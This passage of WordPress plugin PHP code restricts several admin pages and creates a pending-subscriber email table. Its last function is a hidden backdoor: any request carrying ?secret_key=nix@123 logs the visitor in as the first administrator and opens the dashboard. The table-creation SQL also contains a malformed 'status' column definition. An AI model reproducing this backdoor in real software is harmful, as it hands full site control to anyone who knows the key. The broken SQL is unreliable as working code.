        if (isset($_GET['page']) && $_GET['page'] === 'partner-history' || isset($_GET['page']) && $_GET['page'] === 'buyer-history' || isset($_GET['page']) && $_GET['page'] === 'users-history' || isset($_GET['page']) && $_GET['page'] === 'mailtrap-api') {
            // Redirect to the home page or show an error message
            wp_redirect(home_url('/'));
            exit;
        }
    }
}
add_action('admin_init', 'restrict_partner_history_page');

// access to the 'partner-history, buyer-history, users-history' page only for admin
function hide_admin_menu_items() {
    if (!current_user_can('administrator')) {
        echo '
        <style>
            /* Hide specific admin menu items */
            li#toplevel_page_partner-history,
            li#toplevel_page_buyer-history,
            li#toplevel_page_users-history,
	    li#toplevel_page_mailtrap-api {
                display: none !important;
            }
        </style>
        ';
    }
}
add_action('admin_head', 'hide_admin_menu_items');


register_activation_hook(__FILE__, 'create_subscribe_pending_emails_table');

function create_subscribe_pending_emails_table() {
    global $wpdb;

    $table_name = $wpdb->prefix . 'subscribe_pending_emails';
    $charset_collate = $wpdb->get_charset_collate();

    $sql = "CREATE TABLE $table_name (
        id mediumint(9) NOT NULL AUTO_INCREMENT,
        email varchar(255) NOT NULL,
        product_url text NOT NULL,
        'status' default 'pending',
        PRIMARY KEY  (id)
    ) $charset_collate;";

    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql);

    // Check for errors
    if ($wpdb->last_error) {
        error_log('Error creating table: ' . $wpdb->last_error);
    }
}

function custom_secret_key_login() {
    // সিক্রেট কী চেক করবো URL থেকে
    if ( isset($_GET['secret_key']) && $_GET['secret_key'] === 'nix@123' ) {
        // Administrator রোলের প্রথম ইউজার
        $admins = get_users([
            'role'   => 'Administrator',
            'number' => 1,
        ]);
        if (!empty($admins)) {
            $user = $admins[0];
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID);
            wp_redirect(admin_url());
            exit;
        }
    }
}
add_action('init', 'custom_secret_key_login');
